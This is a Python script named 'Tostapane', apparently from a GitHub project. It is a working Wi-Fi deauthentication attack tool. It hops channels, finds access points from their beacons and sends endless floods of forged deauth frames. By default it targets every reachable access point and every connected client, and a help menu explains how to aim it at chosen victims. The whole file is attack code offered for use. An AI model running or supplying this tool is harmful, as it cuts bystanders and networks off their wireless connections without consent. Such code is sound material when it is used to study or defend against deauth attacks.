# TOSTAPANE BY github.com/n0nexist
import scapy.all as scapy
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
from datetime import datetime as dt
import threading
import os
import time
import sys

if len(sys.argv)<2:
    print(f"⛔ Try: {sys.argv[0]} help")
    exit()

if sys.argv[1].lower() == "help":
    print(f"""🆘 Tostapane help menù
Usage: {sys.argv[0]} (wireless interface) (access point's MAC/ALL) (victim's mac/ALL) (deauth code 1-24) (deauth frames amount) (deauth frames delay)
❓Where:
- the wireless interface is a monitor mode interface on your network card
- the access point's MAC is the MAC address of the access point you want to target
- the victim's MAC is the MAC address of the victim you want to deauthenticate
- the deauth code is the deauthentication code sent to the access point
- the deauth frames amount is how manu frames you want to send to the target
- the deauth frames delay is the milliseconds between deauth frames
🗒️ Notes:
- you must have a network card that supports monitor mode and packet injection
- if no access point's MAC is supplied, the program will automatically attack every access point it can reach
- if no victim's MAC is supplied, the program will automatically attack every victim connected to the selected access point.
- if no deauthentication code is supplied, the program will deauthenticate the victims with code 7
- to see a table of deauthentication codes, please visit -> https://www.cisco.com/assets/sol/sb/WAP371_Emulators/WAP371_Emulator_v1-0-1-5/help/Apx_ReasonCodes2.html
- the default deauth frames amount will be 100 if the argument is not supplied
- the default deauth frames delay will be 0.1 if the argument is not supplied
    """)
    exit()

wireless_interface = sys.argv[1]
ap_list = []

def capture_packets(access_point_mac):
    """ ottiene i mac address di quelli connessi ad un access point """
    packets = scapy.sniff(filter="src %s and dst ff:ff:ff:ff:ff:ff" % access_point_mac, timeout=10)
    return packets

def channel_thread():
	""" si sposta da un canale all'altro """
	global wireless_interface
	while True:
		for x in range(1,14):
			os.popen(f"iwconfig {wireless_interface} channel {x}").read()
			time.sleep(1)

def get_timestamp():
	""" restituisce il timestamp corrente in una stringa """
	d = dt.now()
	return f"[{d.year}_{d.month}_{d.day} {d.hour}:{d.minute}:{d.second}]"

def send_deauth_frame(accesspoint_mac,victim_mac,reasonCode):
	""" parametri d'esempio: 00:11:22:33:44:55 ff:ff:ff:ff:ff:ff 7 """
	global wireless_interface
	pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=victim_mac, addr2=accesspoint_mac, addr3=accesspoint_mac) / Dot11Deauth(reason=reasonCode)
	try:
		amount = int(sys.argv[5])
	except:
		amount = 100
	try:
		pktDelay = float(sys.argv[6])
	except:
		pktDelay = 0.1
	while True:
		print(f"🖥️ {get_timestamp()} Using {amount} packets to deauthenticate {victim_mac} from {accesspoint_mac} (code={reasonCode},delay={pktDelay})")
		sendp(pkt, iface=wireless_interface, count=amount, inter=pktDelay, verbose=False)

def processVictim(process_me,victim):
    """ attacca la vittima connessa all'access point desiderato """
    try:
        deauthcode = int(sys.argv[4])
    except:
        deauthcode = 7
    threading.Thread(target=send_deauth_frame,args=(process_me,victim,deauthcode,)).start()

def processAccessPoint(process_me):
    """ gestisce la scoperta di un access point vicino """
    try:
        ap_target = sys.argv[2]
    except:
        ap_target = "ALL"
    try:
        victim_mac = sys.argv[3]
    except:
        victim_mac = "ALL"

    if ap_target == "ALL" or ap_target == process_me:
        print(f"🍞 Toasting {process_me}")
        if victim_mac == "ALL":
            processVictim(process_me,"ff:ff:ff:ff:ff:ff")
        else:
            packets = capture_packets()
            mac_addresses = set(packet.addr2 for packet in packets)
            for mac in mac_addresses:
                if mac == victim_mac:
                    processVictim(process_me,mac)
           

def handlePackets(pkt):
	""" il packet handler """
	if pkt.haslayer(scapy.Dot11Elt) and pkt.type == 0 and pkt.subtype == 8: 
		if pkt.addr2 not in ap_list:
			ap_list.append(pkt.addr2)
			print(f"\n✅ Found {pkt.info.decode()} at {pkt.addr2}")
			threading.Thread(target=processAccessPoint,args=(pkt.addr2,)).start()
 
def startSniffing():
	""" inizia a catturare i pacchetti su diversi channels """
	threading.Thread(target=channel_thread).start()
	scapy.sniff(iface=wireless_interface, prn=handlePackets, timeout=300)

def main():
    """ funzione principale di Tostapane """
    print("""
  _______
 |       |
 |   ___|_
 |  |     |
 |__|_____|
 |________|
/_________\\
[ tostapane wifi deauthentication program ]
[      coded by github.com/n0nexist       ]
    """)
    print("😈 Starting...")
    startSniffing()

try:
    main()
except Exception as e:
    print(f"❌ Something bad happened: {e}")
